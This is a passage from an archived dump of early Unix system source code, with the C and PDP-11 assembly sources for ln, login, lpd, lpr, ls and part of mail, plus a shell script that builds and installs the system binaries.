{
	register st, sd;

	dseek(&text, bno, off, sizeof filhdr);
	mget(&filhdr, sizeof filhdr);
	if (filhdr.fmagic != FMAGIC)
		error(1, "Bad format");
	st = (filhdr.tsize+01) & ~01;
	filhdr.tsize = st;
	cdrel = -st;
	sd = (filhdr.dsize+01) & ~01;
	cbrel = - (st+sd);
	filhdr.bsize = (filhdr.bsize+01) & ~01;
}

cp8c(from, to)
char *from, *to;
{
	register char *f, *t, *te;

	f = from;
	t = to;
	te = t+8;
	while ((*t++ = *f++) && t<te);
	while (t<te)
		*t++ = 0;
}
-- /usr/source/s1/ln.c mode=0100664 uid=3 gid=3 atime=174923130 mtime=169260572 --
#
/*
 * ln target [ new name ]
 */

struct ibuf {
	int	inum;
	int	iflags;
	char	inl;
	char	iuid;
	int	isize;
	int	iaddr[8];
	char	*ictime[2];
	char	*imtime[2];
	int	fill;
};

#define	DIR	040000
#define	FMT	060000

main(argc, argv)
char **argv;
{
	static struct ibuf statb;
	register char *np;

	if (argc<2) {
		write(1, "Usage: ln target [ newname ]\n", 29);
		exit(1);
	}
	if (argc==2) {
		np = argv[1];
		while(*np++);
		while (*--np!='/' && np>argv[1]);
		np++;
		argv[2] = np;
	}
	stat(argv[1], &statb);
	if ((statb.iflags&FMT) == DIR) {
		write(1, "No directory link\n", 18);
		exit(1);
	}
	if (link(argv[1], argv[2])<0) {
		write(1, "Can't link\n", 11);
		exit(1);
	}
	exit(0);
}
-- /usr/source/s1/login.c mode=0100664 uid=3 gid=3 atime=174923140 mtime=169260572 --
#
/*
 * login [ name ]
 */

struct {
	char	name[8];
	char	tty;
	char	ifill;
	int	time[2];
	int	ufill;
} utmp;

struct {
	int	speeds;
	char	erase, kill;
	int	tflags;
} ttyb;

struct {
	int	junk[5];
	int	size;
	int	more[12];
} statb;

char	*ttyx;

#define	ECHO	010

main(argc, argv)
char **argv;
{
	char pbuf[128];
	register char *namep, *np;
	char pwbuf[9];
	int t, sflags, f, c, uid, gid;

	signal(3, 1);
	signal(2, 1);
	nice(0);
	ttyx = "/dev/ttyx";
	if ((utmp.tty=ttyn(0)) == 'x') {
		write(1, "Sorry.\n", 7);
		exit();
	}
	ttyx[8] = utmp.tty;
	gtty(0, &ttyb);
	ttyb.erase = '#';
	ttyb.kill = '@';
	stty(0, &ttyb);
    loop:
	namep = utmp.name;
	if (argc>1) {
		np = argv[1];
		while (namep<utmp.name+8 && *np)
			*namep++ = *np++;
		argc = 0;
	} else {
		write(1, "Name: ", 7);
		while ((c = getchar()) != '\n') {
			if (c <= 0)
				exit();
			if (namep < utmp.name+8)
				*namep++ = c;
		}
	}
	while (namep < utmp.name+8)
		*namep++ = ' ';
	if (getpwentry(utmp.name, pbuf))
		goto bad;
	np = colon(pbuf);
	if (*np!=':') {
		sflags = ttyb.tflags;
		ttyb.tflags =& ~ ECHO;
		stty(0, &ttyb);
		write(1, "Password: ", 10);
		namep = pwbuf;
		while ((c=getchar()) != '\n') {
			if (c <= 0)
				exit();
			if (namep<pwbuf+8)
				*namep++ = c;
		}
		*namep++ = '\0';
		ttyb.tflags = sflags;
		stty(0, &ttyb);
		write(1, "\n", 1);
		namep = crypt(pwbuf);
		while (*namep++ == *np++);
		if (*--namep!='\0' || *--np!=':')
			goto bad;
	}
	np = colon(np);
	uid = 0;
	while (*np != ':')
		uid = uid*10 + *np++ - '0';
	np++;
	gid = 0;
	while (*np != ':')
		gid = gid*10 + *np++ - '0';
	np++;
	np = colon(np);
	namep = np;
	np = colon(np);
	if (chdir(namep)<0) {
		write(1, "No directory\n", 13);
		goto loop;
	}
	time(utmp.time);
	if ((f = open("/etc/utmp", 1)) >= 0) {
		t = utmp.tty;
		if (t>='a')
			t =- 'a' - (10+'0');
		seek(f, (t-'0')*16, 0);
		write(f, &utmp, 16);
		close(f);
	}
	if ((f = open("/usr/adm/wtmp", 1)) >= 0) {
		seek(f, 0, 2);
		write(f, &utmp, 16);
		close(f);
	}
	if ((f = open("/etc/motd", 0)) >= 0) {
		while(read(f, &t, 1) > 0)
			write(1, &t, 1);
		close(f);
	}
	if(stat(".mail", &statb) >= 0 && statb.size)
		write(1, "You have mail.\n", 15);
	chown(ttyx, uid);
	setgid(gid);
	setuid(uid);
	if (*np == '\0')
		np = "/bin/sh";
	execl(np, "-", 0);
	write(1, "No shell.\n", 9);
	exit();
bad:
	write(1, "Login incorrect.\n", 17);
	goto loop;
}

getpwentry(name, buf)
char *name, *buf;
{
	extern fin;
	int fi, r, c;
	register char *gnp, *rnp;

	fi = fin;
	r = 1;
	if((fin = open("/etc/passwd", 0)) < 0)
		goto ret;
loop:
	gnp = name;
	rnp = buf;
	while((c=getchar()) != '\n') {
		if(c <= 0)
			goto ret;
		*rnp++ = c;
	}
	*rnp++ = '\0';
	rnp = buf;
	while (*gnp++ == *rnp++);
	if ((*--gnp!=' ' && gnp<name+8) || *--rnp!=':')
		goto loop;
	r = 0;
ret:
	close(fin);
	fin = 0;
	(&fin)[1] = 0;
	(&fin)[2] = 0;
	return(r);
}

colon(p)
char *p;
{
	register char *rp;

	rp = p;
	while (*rp != ':') {
		if (*rp++ == '\0') {
			write(1, "Bad /etc/passwd\n", 16);
			exit();
		}
	}
	*rp++ = '\0';
	return(rp);
}
-- /usr/source/s1/lpd.s mode=0100664 uid=3 gid=3 atime=174923155 mtime=169260572 --
/ lpd -- Line Printer daemon

.globl	fopen, getc
.globl	fcreat, putc, flush
.globl	switch

	sys	signal; 1; 1
	sys	signal; 2; 1
	sys	signal; 3; 1	/ ignore quit,intr,hup
	sys	stat; lock; buf
	bec	2f
	sys	creat; lock; 0
	bes	2f
	sys	open; lpd; 0
	bes	3f
	mov	r0,r1
1:
	mov	r1,r0
	sys	read; dbuf; 16.
	bes	3f
	tst	r0
	beq	3f
	tst	dbuf
	beq	1b
	cmp	dbuf+2,$"df
	bne	1b
	sys	fork
		br  retry
	sys	exit
3:
	sys	unlink; lock
2:
	sys	exit

/ get line printer
retry:
	jsr	r5,aclose
	mov	$lpr,r0
	jsr	r5,fcreat; print
	bes	error
	sys	chdir; lpd
	bes	error
	sys	open; lpd; 0
	bes	error
	mov	r0,dfi
	br	loop

done:
	sys	unlink; lock
	sys	exit

error:
	jsr	r5,aclose
	mov	$10.,r0
	sys	sleep
	sys	stat; lock; buf
	bes	done			/ die if lock is gone
	br	retry

/ look in directory for work
loop:
	mov	dfi,r0
	sys	seek; 0; 0

1:
	mov	dfi,r0
	sys	read; dbuf; 16.
	bes	error
	tst	r0
	beq	done		/ only non-error return
	tst	dbuf
	beq	1b
	mov	$dbuf+2,r0
	cmp	(r0),$"df		/ look for daemon file
	bne	1b

/ found prototype file
	jsr	r5,fopen; proto
	bes	1b

/ copy a line into buf
/ only work is expansion of tabs
loop1:
	mov	$buf,r1
1:
	jsr	r5,getc; proto
	bes	eloop1
	movb	r0,(r1)
	cmp	r0,$'\t
	beq	2f
	cmpb	(r1)+,$'\n
	bne	1b
	br	1f
2:
	movb	$' ,(r1)+
	cmp	r1,$buf+8.
	beq	1b
	cmp	r1,$buf+16.
	bhis	1b
	br	2b
1:
	movb	buf,r0
	jsr	r5,switch; sptab

/ done with a prototype file
/ look for U's in second pass
eloop1:
	mov	proto,r0
	sys	seek; 0; 0
	br	2f
1:
	jsr	r5,getc; proto
	bes	1f
3:
	cmp	r0,$'\n
	bne	1b
2:
	jsr	r5,getc; proto
	bes	1f
	cmp	r0,$'U
	bne	3b
	mov	$buf,r1
3:
	jsr	r5,getc; proto
	bes	1f
	movb	r0,(r1)+
	cmp	r0,$'\n
	bne	3b
	clrb	-(r1)
	sys	unlink; buf
	br	2b
1:
	mov	proto,r0
	sys	close
	sys	unlink; dbuf+2
	br	loop

/ list of special characters
/ switchout
sptab:
	'L; literal
	'B; binary
	'F; form
	'U; loop1		/ unlink on second pass
	 0; 0


literal:
	jmp	loop1

form:
	clrb	-(r1)
	mov	$buf+1,r0
	jsr	r5,fopen; insert
	bes	loop1
	mov	$14,r0
	jsr	r5,putc; print
	br	1f

binary:
	clrb	-(r1)
	mov	$buf+1,r0
	jsr	r5,fopen; insert
	bes	loop1

1:
	jsr	r5,getc; insert
	bes	1f
	jsr	r5,putc; print
	br	1b
1:
	jsr	r5,flush; print
	mov	insert,r0
	sys	close
	br	loop1

aclose:
	mov	$9.,r1
1:
	mov	r1,r0
	sys	close
	dec	r1
	bge	1b
	rts	r5

lpr:
	</dev/lp\0>
lock:
	</usr/lpd/lock\0>
lpd:
	</usr/lpd\0>
	.even
.bss

ch:	.=.+2
dfi:	.=.+2
dbuf:	.=.+18.
print:	.=.+518.
proto:	.=.+518.
insert:	.=.+518.
buf:	.=.+400.
sleep = 35.
signal = 48.
-- /usr/source/s1/lpr.c mode=0100664 uid=3 gid=3 atime=174923162 mtime=169260572 --
/*
 *	dpr -- off line print via dataphone daemon to GCOS
 *		normally invoked through opr
 */

char	tfname[]	"/usr/lpd/tfaXXXXX";
char	cfname[]	"/usr/lpd/cfaXXXXX";
char	lfname[]	"/usr/lpd/lfaXXXXX";
char	dfname[]	"/usr/lpd/dfaXXXXX";
int	nact;
int	tff;
int	mailflg;
char	person[10];
int	inchar;
int	maxrec	1000;

main(argc, argv)
int argc;
char *argv[];
{
	register char *arg;
	int c, f, flag;
	int out();

	pidfn();
	if((signal(1, 1) & 01) == 0)
		signal(1, out);
	if((signal(2, 1) & 01) == 0)
		signal(2, out);
	if((signal(3, 1) & 01) == 0)
		signal(3, out);
	flag = 0;
	tff = nfile(tfname);
	while (argc>1 && (arg = argv[1])[0]=='-') {
		switch (arg[1]) {

		case 'c':
			flag = '+';
			break;

		case 'r':
			flag = '-';
			break;

		case 'm':
			mailflg = 1;
			break;
		}
		argc--;
		argv++;
	}
	ident();

	if(argc == 1)
		copy(0);
	while(--argc) {
		arg = *++argv;
		if(flag == '+')
			goto cf;
		if(*arg == '/' && flag != '-') {
			card('F', arg);
			nact++;
			continue;
		}
		if(link(arg, lfname) < 0)
			goto cf;
		card('F', lfname);
		card('U', lfname);
		lfname[inchar]++;
		nact++;
		goto df;

	cf:
		f = open(arg, 0);
		if(f < 0) {
			printf("Cannot open %s\n", arg);
			continue;
		}
		copy(f);
		close(f);

	df:
		if(flag == '-') {
			f = unlink(arg);
			if(f < 0)
				printf("Cannot remove %s\n", arg);
		}
	}

	if(nact) {
		tfname[inchar]--;
		f = link(tfname, dfname);
		if(f < 0) {
			printf("Cannot rename %s\n", dfname);
			tfname[inchar]++;
			out();
		}
		unlink(tfname);
		execl("/etc/lpd", "lpd", 0);
		dfname[inchar]++;
	}
	out();
}

copy(f)
int f;
{
	int ff, i, nr, nc;
	static int buf[256];

	card('F', cfname);
	card('U', cfname);
	ff = nfile(cfname);
	nc = 0;
	nr = 0;
	while((i = read(f, buf, 512)) > 0) {
		write(ff, buf, i);
		nc =+ i;
		if(nc >= 512) {
			nc =- 512;
			nr++;
			if(nr > maxrec) {
				printf("Copy file is too large\n");
				break;
			}
		}
	}
	close(ff);
	nact++;
}

card(c, s)
int c;
char s[];
{
	char *p1, *p2;
	static char buf[512];
	int col;

	p1 = buf;
	p2 = s;
	col = 0;
	*p1++ = c;
	while((c = *p2++) != '\0') {
		*p1++ = c;
		col++;
	}
	*p1++ = '\n';
	write(tff, buf, col+2);
}

ident()
{
	int c, n;
	register char *b1p, *pp, *b2p;
	static char b1[100], b2[100];

	b1p = b1;
	if(getpw(getuid(), b1p)) {
		b1p = "pdp::::m0000,m000:";
	}
	n = 0;
	b2p = b2;
	while(*b2p++ = "$	ident	"[n++]);
	b2p--;
	n = 5;
	while(--n) while(*b1p++ != ':');
	while((*b2p++ = *b1p++) != ':');
	b2p[-1] = ',';
	b1p = b1;
	pp = person;
	while((c = *b1p++) != ':') {
		*b2p++ = c;
		*pp++ = c;
	}
	*b2p++ = 0;
	*pp++ = 0;
	card('L', b2);
	if (mailflg)
		card('M', person);
}

pidfn()
{
	register i, j, c;
	int p;

	p = getpid();
	i = 0;
	while(tfname[i] != 'X')
		i++;
	i =+ 4;
	for(j=0; j<5; j++) {
		c = (p%10) + '0';
		p =/ 10;
		tfname[i] = c;
		cfname[i] = c;
		lfname[i] = c;
		dfname[i] = c;
		i--;
	}
	inchar = i;
}

nfile(name)
char *name;
{
	register f;

	f = creat(name, 0666);
	if(f < 0) {
		printf("Cannot create %s\n", name);
		out();
	}
	name[inchar]++;
	return(f);
}

out()
{
	register i;

	signal(1, 1);
	signal(1, 2);
	signal(1, 3);
	i = inchar;
	while(tfname[i] != 'a') {
		tfname[i]--;
		unlink(tfname);
	}
	while(cfname[i] != 'a') {
		cfname[i]--;
		unlink(cfname);
	}
	while(lfname[i] != 'a') {
		lfname[i]--;
		unlink(lfname);
	}
	while(dfname[i] != 'a') {
		dfname[i]--;
		unlink(dfname);
	}
	exit();
}
-- /usr/source/s1/ls.c mode=0110664 uid=3 gid=3 atime=174923177 mtime=169260572 --
#
/*
 * list file or directory
 */

struct {
	int	fdes;
	int	nleft;
	char	*nextc;
	char	buff[512];
} inf;

struct ibuf {
	int	idev;
	int	inum;
	int	iflags;
	char	inl;
	char	iuid;
	char	igid;
	char	isize0;
	int	isize;
	int	iaddr[8];
	char	*iatime[2];
	char	*imtime[2];
};

struct lbuf {
	char	lname[15];
	int	lnum;
	int	lflags;
	char	lnl;
	char	luid;
	char	lgid;
	char	lsize0;
	int	lsize;
	char	*lmtime[2];
};

struct lbufx {
	char	*namep;
};

int	aflg, dflg, lflg, sflg, tflg, uflg, iflg, fflg, gflg;
int	fout;
int	rflg	1;
char	*year;
int	flags;
int	uidfil	-1;
int	lastuid	-1;
char	tbuf[16];
int	tblocks;
int	statreq;
struct	lbuf	*lastp	&end;
struct	lbuf	*rlastp	&end;
char	*dotp	".";

#define	IFMT	060000
#define	DIR	0100000
#define	CHR	020000
#define	BLK	040000
#define	ISARG	01000
#define	LARGE	010000
#define	STXT	010000
#define	SUID	04000
#define	SGID	02000
#define	ROWN	0400
#define	WOWN	0200
#define	XOWN	0100
#define	RGRP	040
#define	WGRP	020
#define	XGRP	010
#define	ROTH	04
#define	WOTH	02
#define	XOTH	01
#define	RSTXT	01000

main(argc, argv)
char **argv;
{
	int i, j;
	extern struct lbuf end;
	register struct lbuf *ep, *ep1;
	register struct lbuf *slastp;
	struct lbuf lb;
	int t;
	int compar();

	fout = dup(1);
	time(lb.lmtime);
	year = lb.lmtime[0] - 245; /* 6 months ago */
	if (--argc > 0 && *argv[1] == '-') {
		argv++;
		while (*++*argv) switch (**argv) {
		case 'a':
			aflg++;
			continue;

		case 's':
			sflg++;
			statreq++;
			continue;

		case 'd':
			dflg++;
			continue;

		case 'g':
			gflg++;
			continue;

		case 'l':
			lflg++;
			statreq++;
			continue;

		case 'r':
			rflg = -1;
			continue;

		case 't':
			tflg++;
			statreq++;
			continue;

		case 'u':
			uflg++;
			continue;

		case 'i':
			iflg++;
			continue;

		case 'f':
			fflg++;
			continue;

		default:
			continue;
		}
		argc--;
	}
	if (fflg) {
		aflg++;
		lflg = 0;
		sflg = 0;
		tflg = 0;
		statreq = 0;
	}
	if(lflg) {
		t = "/etc/passwd";
		if(gflg)
			t = "/etc/group";
		uidfil = open(t, 0);
	}
	if (argc==0) {
		argc++;
		argv = &dotp - 1;
	}
	for (i=0; i < argc; i++) {
		if ((ep = gstat(*++argv, 1))==0)
			continue;
		ep->namep = *argv;
		ep->lflags =| ISARG;
	}
	qsort(&end, lastp - &end, sizeof *lastp, compar);
	slastp = lastp;
	for (ep = &end; ep<slastp; ep++) {
		if (ep->lflags&DIR && dflg==0 || fflg) {
			if (argc>1)
				printf("\n%s:\n", ep->namep);
			lastp = slastp;
			readdir(ep->namep);
			if (fflg==0)
				qsort(slastp,lastp - slastp,sizeof *lastp,compar);
			if (statreq)
				printf("total %d\n", tblocks);
			for (ep1=slastp; ep1<lastp; ep1++)
				pentry(ep1);
		} else 
			pentry(ep);
	}
	flush();
}

pentry(ap)
struct lbuf *ap;
{
	struct { char dminor, dmajor;};
	register t;
	register struct lbuf *p;
	register char *cp;

	p = ap;
	if (p->lnum == -1)
		return;
	if (iflg)
		printf("%5d ", p->lnum);
	if (lflg) {
		pmode(p->lflags);
		printf("%2d ", p->lnl);
		t = p->luid;
		if(gflg)
			t = p->lgid;
		t =& 0377;
		if (getname(t, tbuf)==0)
			printf("%-6.6s", tbuf);
		else
			printf("%-6d", t);
		if (p->lflags & (BLK|CHR))
			printf("%3d,%3d", p->lsize.dmajor&0377,
			    p->lsize.dminor&0377);
		else
			printf("%7s", locv(p->lsize0, p->lsize));
		cp = ctime(p->lmtime);
		if(p->lmtime[0] < year)
			printf(" %-7.7s %-4.4s ", cp+4, cp+20); else
			printf(" %-12.12s ", cp+4);
	} else if (sflg)
		printf("%4d ", nblock(p->lsize0, p->lsize));
	if (p->lflags&ISARG)
		printf("%s\n", p->namep);
	else
		printf("%.14s\n", p->lname);
}

getname(uid, buf)
int uid;
char buf[];
{
	int j, c, n, i;

	if (uid==lastuid)
		return(0);
	inf.fdes = uidfil;
	seek(inf.fdes, 0, 0);
	inf.nleft = 0;
	lastuid = -1;
	do {
		i = 0;
		j = 0;
		n = 0;
		while((c=getc(&inf)) != '\n') {
			if (c<0)
				return(-1);
			if (c==':') {
				j++;
				c = '0';
			}
			if (j==0)
				buf[i++] = c;
			if (j==2)
				n = n*10 + c - '0';
		}
	} while (n != uid);
	buf[i++] = '\0';
	lastuid = uid;
	return(0);
}

nblock(size0, size)
char *size0, *size;
{
	register int n;

	n = ldiv(size0, size, 512);
	if (size&0777)
		n++;
	if (n>8)
		n =+ (n+255)/256;
	return(n);
}

int	m0[] { 3, DIR, 'd', BLK, 'b', CHR, 'c', '-'};
int	m1[] { 1, ROWN, 'r', '-' };
int	m2[] { 1, WOWN, 'w', '-' };
int	m3[] { 2, SUID, 's', XOWN, 'x', '-' };
int	m4[] { 1, RGRP, 'r', '-' };
int	m5[] { 1, WGRP, 'w', '-' };
int	m6[] { 2, SGID, 's', XGRP, 'x', '-' };
int	m7[] { 1, ROTH, 'r', '-' };
int	m8[] { 1, WOTH, 'w', '-' };
int	m9[] { 1, XOTH, 'x', '-' };
int	m10[] { 1, STXT, 't', ' ' };

int	*m[] { m0, m1, m2, m3, m4, m5, m6, m7, m8, m9, m10};

pmode(aflag)
{
	register int **mp;

	flags = aflag;
	for (mp = &m[0]; mp < &m[11];)
		select(*mp++);
}

select(pairp)
int *pairp;
{
	register int n, *ap;

	ap = pairp;
	n = *ap++;
	while (--n>=0 && (flags&*ap++)==0)
		ap++;
	putchar(*ap);
}

makename(dir, file)
char *dir, *file;
{
	static char dfile[100];
	register char *dp, *fp;
	register int i;

	dp = dfile;
	fp = dir;
	while (*fp)
		*dp++ = *fp++;
	*dp++ = '/';
	fp = file;
	for (i=0; i<14; i++)
		*dp++ = *fp++;
	*dp = 0;
	return(dfile);
}

readdir(dir)
char *dir;
{
	static struct {
		int	dinode;
		char	dname[14];
	} dentry;
	register char *p;
	register int j;
	register struct lbuf *ep;

	if (fopen(dir, &inf) < 0) {
		printf("%s unreadable\n", dir);
		return;
	}
	tblocks = 0;
	for(;;) {
		p = &dentry;
		for (j=0; j<16; j++)
			*p++ = getc(&inf);
		if (dentry.dinode==0
		 || aflg==0 && dentry.dname[0]=='.')
			continue;
		if (dentry.dinode == -1)
			break;
		ep = gstat(makename(dir, dentry.dname), 0);
		if (ep->lnum != -1)
			ep->lnum = dentry.dinode;
		for (j=0; j<14; j++)
			ep->lname[j] = dentry.dname[j];
	}
	close(inf.fdes);
}

gstat(file, argfl)
char *file;
{
	struct ibuf statb;
	register struct lbuf *rep;

	if (lastp+1 >= rlastp) {
		sbrk(512);
		rlastp.idev =+ 512;
	}
	rep = lastp;
	lastp++;
	rep->lflags = 0;
	rep->lnum = 0;
	if (argfl || statreq) {
		if (stat(file, &statb)<0) {
			printf("%s not found\n", file);
			statb.inum = -1;
			statb.isize0 = 0;
			statb.isize = 0;
			statb.iflags = 0;
			if (argfl) {
				lastp--;
				return(0);
			}
		}
		rep->lnum = statb.inum;
		statb.iflags =& ~DIR;
		if ((statb.iflags&IFMT) == 060000) {
			statb.iflags =& ~020000;
		} else if ((statb.iflags&IFMT)==040000) {
			statb.iflags =& ~IFMT;
			statb.iflags =| DIR;
		}
		statb.iflags =& ~ LARGE;
		if (statb.iflags & RSTXT)
			statb.iflags =| STXT;
		statb.iflags =& ~ RSTXT;
		rep->lflags = statb.iflags;
		rep->luid = statb.iuid;
		rep->lgid = statb.igid;
		rep->lnl = statb.inl;
		rep->lsize0 = statb.isize0;
		rep->lsize = statb.isize;
		if (rep->lflags & (BLK|CHR) && lflg)
			rep->lsize = statb.iaddr[0];
		rep->lmtime[0] = statb.imtime[0];
		rep->lmtime[1] = statb.imtime[1];
		if(uflg) {
			rep->lmtime[0] = statb.iatime[0];
			rep->lmtime[1] = statb.iatime[1];
		}
		tblocks =+ nblock(statb.isize0, statb.isize);
	}
	return(rep);
}

compar(ap1, ap2)
struct lbuf *ap1, *ap2;
{
	register struct lbuf *p1, *p2;
	register int i;
	int j;
	struct { char *charp;};

	p1 = ap1;
	p2 = ap2;
	if (dflg==0) {
		if ((p1->lflags&(DIR|ISARG)) == (DIR|ISARG)) {
			if ((p2->lflags&(DIR|ISARG)) != (DIR|ISARG))
				return(1);
		} else {
			if ((p2->lflags&(DIR|ISARG)) == (DIR|ISARG))
				return(-1);
		}
	}
	if (tflg) {
		i = 0;
		if (p2->lmtime[0] > p1->lmtime[0])
			i++;
		else if (p2->lmtime[0] < p1->lmtime[0])
			i--;
		else if (p2->lmtime[1] > p1->lmtime[1])
			i++;
		else if (p2->lmtime[1] < p1->lmtime[1])
			i--;
		return(i*rflg);
	}
	if (p1->lflags&ISARG)
		p1 = p1->namep;
	else
		p1 = p1->lname;
	if (p2->lflags&ISARG)
		p2 = p2->namep;
	else
		p2 = p2->lname;
	for (;;)
		if ((j = *p1.charp++ - *p2.charp++) || p1.charp[-1]==0)
			return(rflg*j);
	return(0);
}
-- /usr/source/s1/run mode=0100664 uid=3 gid=3 atime=174926916 mtime=174917282 --
cc -s -f -O ac.c
cmp a.out /usr/bin/ac
cp a.out /usr/bin/ac

as ar.s
strip a.out
cmp a.out /bin/ar
cp a.out /bin/ar

cc -s -O banner.c
cmp a.out /usr/bin/banner
cp a.out /usr/bin/banner

as bas.s
ld -s -n a.out -l
cmp a.out /bin/bas
cp a.out /bin/bas

yacc bc.y
cc -s -O y.tab.c -ly
cmp a.out /usr/bin/bc
cp a.out /usr/bin/bc
rm y.tab.c

cc -s -O bcd.c
cmp a.out /usr/bin/bcd
cp a.out /usr/bin/bcd

cc -s -O cal.c
cmp a.out /usr/bin/cal
cp a.out /usr/bin/cal

as cat.s
strip a.out
cmp a.out /bin/cat
cp a.out /bin/cat

cc -s -n -O cc.c
cmp a.out /bin/cc
cp a.out /bin/cc

cc -s -f -O cdb?.c
cmp a.out /bin/cdb
cp a.out /bin/cdb
rm cdb?.o

as chgrp.s
ld -s a.out -l
cmp a.out /bin/chgrp
cp a.out /bin/chgrp

cc -s -O chmod.c
cmp a.out /bin/chmod
cp a.out /bin/chmod

as chown.s
ld -s a.out -l
cmp a.out /bin/chown
cp a.out /bin/chown

as clri.s
strip a.out
cmp a.out /bin/clri
cp a.out /bin/clri

cc -s -O cmp.c
cmp a.out /bin/cmp
cp a.out /bin/cmp

cc -s -O col.c
cmp a.out /usr/bin/col
cp a.out /usr/bin/col

cc -s -O comm.c
cmp a.out /usr/bin/comm
cp a.out /usr/bin/comm

cc -s -O cp.c
cmp a.out /bin/cp
cp a.out /bin/cp

cc -s -O cpall.c
cmp a.out /usr/bin/cpall
cp a.out /usr/bin/cpall

cc -s -O cron.c
cmp a.out /etc/cron
cp a.out /etc/cron

cc -s -O crypt.c
cmp a.out /usr/bin/crypt
cp a.out /usr/bin/crypt

cc -s -O date.c
cmp a.out /bin/date
cp a.out /bin/date

as db?.s
strip a.out
cmp a.out /bin/db
cp a.out /bin/db

as dc?.s
strip a.out
cmp a.out /bin/dc
cp a.out /bin/dc

cc -s -O dcheck.c
cmp a.out /bin/dcheck
cp a.out /bin/dcheck

cc -s -O dd.c
cmp a.out /bin/dd
cp a.out /bin/dd

cc -s -O df.c
cmp a.out /bin/df
cp a.out /bin/df

cc -c -O diff1.c
as diff2.s
cc -s diff1.o a.out
cmp a.out /usr/bin/diff
cp a.out /usr/bin/diff
rm diff1.o

as dsw.s
strip a.out
cmp a.out /bin/dsw
cp a.out /bin/dsw

as du.s
ld -s a.out -l
cmp a.out /bin/du
cp a.out /bin/du

cc -s -O dump.c
cmp a.out /bin/dump
cp a.out /bin/dump

cc -s -O echo.c
cmp a.out /bin/echo
cp a.out /bin/echo

cc -s -n -O ed.c
cmp a.out /bin/ed
cp a.out /bin/ed

cc -s -O exit.c
cmp a.out /bin/exit
cp a.out /bin/exit

cc -s -O fc.c
cmp a.out /bin/fc
cp a.out /bin/fc

as fed?.s form[56].s
strip a.out
cmp a.out /usr/bin/fed
cp a.out /usr/bin/fed

cc -s -O file.c
cmp a.out /bin/file
cp a.out /bin/file

cc -s -O find.c
cmp a.out /usr/bin/find
cp a.out /usr/bin/find

as form?.s
strip a.out
cmp a.out /usr/bin/form
cp a.out /usr/bin/form

cc -s -n -O getty.c
cmp a.out /etc/getty
cp a.out /etc/getty

cc -s -n -O glob.c
cmp a.out /etc/glob
cp a.out /etc/glob

cc -s -O goto.c
cmp a.out /bin/goto
cp a.out /bin/goto

cc -s -O grep.c
cmp a.out /usr/bin/grep
cp a.out /usr/bin/grep

cc -s -O gsi.c
cmp a.out /usr/bin/gsi
cp a.out /usr/bin/gsi

cc -s -O icheck.c
cmp a.out /bin/icheck
cp a.out /bin/icheck

cc -s -O if.c
cmp a.out /bin/if
cp a.out /bin/if

cc -s -n -O init.c
cmp a.out /etc/init
cp a.out /etc/init

as kill.s
strip a.out
cmp a.out /bin/kill
cp a.out /bin/kill

cc -s -n -O ld.c
cmp a.out /bin/ld
cp a.out /bin/ld

cc -s -O ln.c
cmp a.out /bin/ln
cp a.out /bin/ln

cc -s -O login.c
cmp a.out /bin/login
cp a.out /bin/login

as lpd.s
ld -s a.out -l
cmp a.out /etc/lpd
cp a.out /etc/lpd

cc -s -O lpr.c
cmp a.out /lib/lpr
cp a.out /lib/lpr

cc -s -n -O ls.c
cmp a.out /bin/ls
cp a.out /bin/ls

rm a.out
-- /usr/source/s2 mode=0140775 uid=3 gid=3 atime=174930092 mtime=174923947 --
-- /usr/source/s2/mail.c mode=0110664 uid=3 gid=3 atime=174923200 mtime=169260598 --
#
/* mail command usage
	mail
		prints your mail
	mail people
		sends standard input to people
 */

#define	SIGINT	2

struct	utmp {
	char	name[8];
	char	tty;
	char	pad1;
	int	ltime[2];
	int	pad2;
};

struct	passwd {
	char	*pw_name;
	char	*pw_passwd;
	int	pw_uid;
	int	pw_gid;
	char	*pw_gecos;
	char	*pw_dir;
	char	*pw_shell;
};

char	lettmp[] "/tmp/maxxxxx";
char	preptmp[] "/tmp/mbxxxxx";
int	pwfil;

main(argc, argv)
char **argv;
{
	register me;
	extern fout;
	register struct passwd *p;
	register char *cp;
	static struct utmp ubuf;
	int uf;

	maketemp();
	if (argc==1 || argc==2 && argv[1][0]=='-') {
		printmail(argc, argv);
		delexit();
	}
	signal(SIGINT, delexit);
	fout = creat(lettmp, 0600);
	if (((me=ttyn(1))!='x' || (me=ttyn(2))!='x')
	 && (uf = open("/etc/utmp", 0)) > 0) {
		while (read(uf, &ubuf, sizeof ubuf) == sizeof ubuf)
			if (ubuf.tty == me) {
				ubuf.name[8] = ' ';
				close(uf);
				for (cp=ubuf.name; *cp++!=' ';);
				*--cp = 0;
				bulkmail(argc, argv, ubuf.name);
			}
	}
	me = getuid() & 0377;
	setpw();
	for (;;)
		if ((p = getpwent()) && p->pw_uid == me)
			bulkmail(argc, argv, p->pw_name);
	fout = 1;
	printf("Who are you?\n");
	delexit();
}

printmail(argc, argv)
char **argv;
{
	extern fin, fout;
	register n, c, f;

	if (fopen(".mail", &fin)>=0 && (c = getchar())) {
		do {
			putchar(c);
		} while (c = getchar());
		close(fin);
		c = 'y';
		if (argc<2) {
			if (ttyn(0)!='x') {
				printf("Save?");
				fin = 0;
				c = getchar();
			}
		} else
			c = argv[1][1];
		if (c=='y') {
			prepend(".mail", "mbox");
			printf("Saved mail in 'mbox'\n");
		}
		close(creat(".mail"));
	} else
		printf("No mail.\n");
}

bulkmail(argc, argv, from)
char **argv, *from;
{
	extern fin, fout;
	int tbuf[2];
	register c;

	fin = 0;
	(&fin)[1] = 0;
	time(tbuf);
	printf("From %s %s", from, ctime(tbuf));
	while (c = getchar())
		putchar(c);
	putchar('\n');
	flush();
	close(fout);
	while (--argc > 0)
		sendto(*++argv);
	delexit();
}

sendto(person)
char *person;
{
	static saved;
	extern fout;
	extern fin;
	register struct passwd *p;

	setpw();
	while (p = getpwent()) {
		if (equal(p->pw_name, person)) {
			if (prepend(lettmp, cat(p->pw_dir, "/.mail"))==0)
				break;
			return;
		}
	}
	fout = 1;
	flush();
	printf("Can't send to %s.\n", person);
	if (ttyn(0)!='x' && saved==0) {
		unlink("dead.letter");
		saved++;
		printf("Letter saved in 'dead.letter'\n");
		prepend(lettmp, "dead.letter");
	}
}

prepend(from, to)
char *from, *to;
{
	extern int fin, fout;

	fcreat(preptmp, &fout);
	fopen(from, &fin);
	while (putchar(getchar()));
	close(fin);
	fopen(to, &fin);
	while (putchar(getchar()));
	close(fin);
	flush();
	close(fout);
	if (fcreat(to, &fout) < 0) {
		fout = 1;
		return(0);
	}
	fopen(preptmp, &fin);
	while(putchar(getchar()));
	flush();
	close(fout);
	close(fin);
	fout = 1;
	return(1);
}

setpw()
